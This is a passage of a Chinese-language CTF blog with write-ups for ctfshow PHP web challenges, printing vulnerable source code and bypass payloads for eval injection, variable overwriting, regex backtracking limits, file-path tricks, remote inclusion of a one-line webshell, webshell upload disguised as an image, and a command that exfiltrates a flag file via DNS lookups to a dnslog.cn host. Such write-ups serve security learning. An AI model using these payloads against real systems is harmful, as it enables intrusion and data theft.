<li>$_SERVER<br><code>$_SERVER</code> 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。<br><code>$_SERVER[&#39;argv&#39;]</code> 传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。query string（查询字符串），如果有的话，通过它进行页面访问。</li>
</ul>
<p><a href="https://www.php.net/manual/zh/reserved.variables.server">SERVER更详细的解释</a></p>
<ul>
<li><p>PHP中非法参数传参<br>PHP中传参的合法参数只有字母数字下划线，出现非法参数(. [ ] 空格等)会自动转化为下划线(_)。<br>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_<br>这个问题在PHP8中得到修复。<br>更详细的解释参考这篇文章：<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">谈一谈PHP中关于非法参数名传参问题</a></p>
</li>
<li><p>extract()函数<br> 从数组中将变量导入到当前的符号表</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extract(array &amp;$array, int $flags = EXTR_OVERWRITE, string $prefix = &quot;&quot;): int</span><br><span class="line">本函数用来将变量从数组中导入到当前的符号表中。</span><br><span class="line">检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</span><br><span class="line">警告</span><br><span class="line">不要对不可信的数据使用 extract()，类似用户输入 （例如 $_GET、$_FILES）。</span><br></pre></td></tr></table></figure>
<p><a href="https://www.php.net/manual/zh/function.extract">更详细的解释</a></p>
</li>
<li><p>get_defined_vars()函数<br>返回由所有已定义变量所组成的数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_defined_vars(): array</span><br><span class="line">此函数返回多维数组。包含调用 get_defined_vars() 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</span><br></pre></td></tr></table></figure>
</li>
<li><p>implode()函数<br>用字符串连接数组元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">implode(string $separator, array $array): string</span><br><span class="line">返回一个包含所有数组元素并且顺序相同的字符串， 每个元素之间有 separator 分隔。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>POST方法传入fun，CTF_SHOW，CTF_SHOW.COM。并且不能以GET方法传入fl0g。<br>fun经过了一些过滤，如果绕开了过滤则能作为代码执行，之后如果变量fl0g全等于flag_give_me，则输出flag</p>
<ol start="2">
<li>构造payload<br>这一题构造payload的方法非常多，因为给的空间很大。<br>第1种：<br>最简单，直接在eval代码执行的时候就输出flag：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code><br>第2种：<br>通过SERVER构造payload：<br>GET: <code>?$fl0g=flag_give_me;</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</code><br>第3种：<br>通过函数输出构造payload：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo implode(get_defined_vars())</code><br>最后是通过变量覆盖的两个函数构造出两种payload：<br>第4种：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</code><br>第5种：<br>+隔断argv<br>GET: <code>?a=1+fl0g=flag_give_me</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></li>
</ol>
<p>均可成功拿到flag</p>
<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只是比之前多过滤了一些字符，区别不大。</p>
</li>
<li><p>构造payload<br>上一题中第4，5种方法仍然能用。<br>此外可以使用highlight_file()函数打印输出一个文件，而我们只需要想办法把这个文件变成flag.php即可。<br>GET: <code>?1=flag.php</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code><br>成功拿到flag</p>
</li>
</ol>
<h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>assert()函数<br>检查断言是否为 false<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assert(mixed $assertion, string $description = ?): bool</span><br><span class="line">传统断言（PHP 5 和 7）</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
<a href="https://www.php.net/manual/zh/function.assert.php">官方文档</a></li>
</ul>
<p>增加过滤了几个字符。</p>
<ol start="2">
<li>构造payload<br>上上题中第2,5种方法仍然能用。<br>另一种方法是代码执行：<br>GET: <code>?$fl0g=flag_give_me</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</code><br>成功拿到flag</li>
</ol>
<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大意就是用waf检测整个url，不在黑名单中的才能绕过。通过变量覆盖，相当于GET传入一个变量ctf_show</p>
</li>
<li><p>构造payload<br>由于黑名单过滤了下划线(_)，所以需要用空格代替，因为空格是非法字符，会自动转化为下划线。<br>于是我们构造payload符合条件，便能得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>gettext()函数<br>在当前域中查找信息<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gettext(string $message): string</span><br><span class="line">如果在翻译表中找到一个已翻译的字符串，则返回一个已翻译的字符串，如果未找到，则返回提交的消息。</span><br><span class="line">注意：</span><br><span class="line">可以使用下划线字符“_”作为此函数的别名。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过GET传入两个参数f1,f2。参数f1不能包含数字和字母。<br>可以使用gettext函数，通过别名下划线（_）来绕开检查。<br>经过连续两个回调函数后输出值。</p>
<ol start="2">
<li>构造payload<br>参数f1用下划线绕开检查，然后参数f2可以使用get_defined_vars返回所有信息，其中就包括了变量名与变量的值。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>
成功拿到flag</li>
</ol>
<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>stripos()函数<br>查找字符串首次出现的位置（不区分大小写）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stripos(string $haystack, string $needle, int $offset = 0): int|false</span><br><span class="line">返回在字符串 haystack 中 needle 首次出现的数字位置。</span><br><span class="line">与 strpos() 不同，stripos() 不区分大小写。</span><br><span class="line">在 PHP 8.0.0 之前，如果 needle 不是字符串，则会将其转换为整数并用作字符的序数值。此行为自 PHP 7.3.0 起已弃用，强烈建议不要依赖它。</span><br><span class="line">根据预期的行为，needle应该显式转换为字符串，或者应该执行对 chr() 的显式调用。</span><br><span class="line">返回值</span><br><span class="line">返回 needle 存在于 haystack 字符串开始的位置(独立于偏移量)。同时注意字符串位置起始于 0，而不是 1。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过GET方式传入变量f，要求变量f中有字符串ctfshow且不在第1位。</p>
<ol start="2">
<li>构造payload<br>要绕开readfile的方式有三种，</li>
</ol>
<ul>
<li>第1种：<br>使用php伪协议绕过：<br><code>?f=php://fiter/ctfshow/resource=flag.php</code></li>
<li>第2种：<br>使用目录穿越的方式绕过：<br><code>?f=./ctfshow/../flag.php</code></li>
<li>第3种：<br>远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。<br><code>f=http://url/123.txt?ctfshow</code><br>其中123.txt为一句话木马。</li>
</ul>
<p>成功拿到flag</p>
<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>PCRE回溯次数限制<br>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将返回 false。<br>可以参考这篇文章：<a href="leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li>
</ul>
<p>通过POST传入一个参数f，第1个if语句将f进行preg_match正则匹配，点号(.)表示任意单个字符串（但不会匹配换行符\n），加号(+)表示匹配1次或多次，问号(?)表示匹配0次或1次匹配前面的字符串。i表示不区分大小写，s表示匹配任何空白字符，包括空格、制表符和换页符。<br>若未匹配到进入下一个if语句匹配字符串中是否有字符ctfshow。<br>通过两个if语句即可拿到flag。</p>
<ol start="2">
<li>构造payload</li>
</ol>
<ul>
<li><p>第1种<br>根据PCRE回溯次数限制，我们可以写个python脚本让回溯次数超过1000000次，这样就能绕开preg_match，将ctfshow有效传下去，脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ce455ed5-7390-42ee-b754-0f64b36f4551.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;f&quot;</span>: <span class="string">&quot;1111&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;ctfshow&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, data=data).text)</span><br></pre></td></tr></table></figure>
<p>运行后成功拿到flag</p>
</li>
<li><p>第2种<br>根据该preg_match可知，需要先匹配了任意单个字符串后才会匹配是否存在ctfshow，如果我们一开始就匹配ctfshow，则能直接绕过：<br>POST: <code>f=ctfshow</code></p>
</li>
<li><p>第3种<br>preg_match无法处理数组，于是可以通过传入数组绕开：<br>POST: <code>f[]=</code> 或 <code>f=ctfshow[]</code></p>
</li>
<li><p>第4种<br>由于正则中的点号(.)不会匹配\n，因此可以通过换行符绕过：<br>POST: <code>f=ctfshow\n</code></p>
</li>
</ul>
<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和上一题相似度很高，区别在于通过POST传入的变量均进行了字符串化，这样一来无法使用数组和换行符绕过。<br>第2个if语句匹配的字符串成了36Dctfshow，无法直接传参绕过正则。</p>
</li>
<li><p>构造payload<br>上一题的第1种方法还能使用，只是需要稍微改改脚本罢了。</p>
</li>
</ol>
<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><ol>
<li>查看源码<br>一开始出现了个博客页面，我还以为自己搞错了，做了那么多直接显示源代码的题，没反应过来…<br>首先拿后台扫描工具爆破下：<br>我们可以看到 <code>/admin</code> 会显示有跳转，于是直接访问admin页面，那么得到了真正需要的php源码。或者 <code>robots.txt</code> 也可显示真正需要访问的页面。<br>这个题应该是模拟后台管理员登录。<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>mt_rand()函数<br>通过梅森旋转（Mersenne Twister）随机数生成器生成随机值。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_rand(int $min, int $max): int</span><br><span class="line">警告</span><br><span class="line">本函数并不会生成安全加密的值，并且不可用于加密或者要求返回值不可猜测的目的。</span><br><span class="line">mt_rand() 函数是旧的 rand() 的临时替代。该函数用了» 梅森旋转中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 rand() 快四倍。</span><br></pre></td></tr></table></figure>
通过GET传入三个参数username,password和code<br>三个参数均进行了string转换，在第1个if语句判断中，注意到 <code>||</code> 。<br>于是可以只满足一个条件，即： <code>$username ===&quot;admin&quot;</code><br>因此参数code和password可控。<br>第2个if语句中，code需要满足等于admin的条件，于是直接构造payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6c73c641-6607-49de-9ff8-757e351e1ab6.challenge.ctf.show/admin/?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure>
成功拿到flag</li>
</ul>
<h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>@</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = @$_GET[&#x27;F&#x27;]</span><br><span class="line">其中的 @ 是为了防止没有 $_GET[&#x27;F&#x27;]出现错误提示.</span><br><span class="line">但是 @ 的代价过高, 一般都用 isset() 来判断一下</span><br><span class="line">相当于isset()</span><br></pre></td></tr></table></figure>
</li>
<li><p>linux grep,tr命令<br>Linux grep 命令用于查找文件里符合条件的字符串。<br>Linux tr 命令用于转换或删除文件中的字符。<br>详细解释：<a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令</a> 和 <a href="https://www.runoob.com/linux/linux-comm-tr.html">Linux tr命令</a></p>
</li>
<li><p>curl -c 命令<br>-c参数将服务器设置的 Cookie 写入一个文件。<br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南</a></p>
</li>
<li><p>shell_exec()函数<br>``是shell_exec()函数的缩写。shell_exec — 通过 webshell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
</li>
</ul>
<p>通过GET传入一个参数F，然后进行正则匹配。如果通过则将6个字符输出为代码。<br>这里需要用变量覆盖，自己覆盖自己，从而绕过substr。有点像双写绕过。</p>
<ol start="2">
<li>构造payload<br>使用变量覆盖: ?F&#x3D;`$F`;<br>如此一来自己覆盖自己，第1次能够通过substr，第2次就不需要通过substr，能够完整输出了。因此可以在6个字符之后加需要的命令来返回flag。<br>使用dnslog生成子域名，将得到的子域名放入GET中，在返回的查询记录中得到flag，构造payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.o9u0j4.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>
在查询记录中显示如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flagctfshow6a739952ac4b406ea6890b16d9a5c293.o9u0j4.dnslog.cn</span><br></pre></td></tr></table></figure>
通过构造flag的格式，ctfshow{8-4-4-4-12}即可成功拿到flag。<br>另外的方法可参考这篇文章：<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-文件上传</title>
    <url>/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没啥好说的。</p>
<span id="more"></span>
<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><ol>
<li>分析<br>通过尝试可知，这是在前端验证，于是我们尝试禁用js，但是会导致无法上传文件，于是放弃该方案。<br>然后通过尝试上传文件发现，只能上传后缀为png格式的文件，我们可以将一句话木马改为png格式上传，再用burp抓包后改为php后缀，最后使用蚁剑连接即可。</li>
<li>上传<br>和分析情况相同，直接上传成功，用蚁剑连接后，在上一级目录拿到flag。</li>
</ol>
<h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>考点是MIME Type，验证Content-Type是否为Image&#x2F;png<br>方式和前一题一样</p>
